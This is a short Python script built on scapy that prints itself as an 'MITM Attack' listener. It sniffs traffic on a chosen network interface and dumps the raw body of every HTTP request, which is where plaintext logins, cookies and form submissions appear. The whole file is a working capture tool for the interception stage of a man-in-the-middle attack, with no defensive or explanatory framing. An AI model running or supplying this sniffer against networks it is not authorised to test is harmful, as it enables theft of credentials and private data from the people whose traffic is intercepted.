import scapy.all as scapy
from scapy.layers import http
import optparse

def get_user_data():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-i","--interface",dest="interface",help="please insert your interface !!!")
    return parse_object.parse_args()
def listening_packet(interface):
    scapy.sniff(iface=interface,store=False,prn=analyzed_packet)

def analyzed_packet(packet):
    packet.show()
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


print("Welcome MITM Attack 2 Listener Level")
(user_data)=get_user_data()[0]
listening_packet(user_data.interface)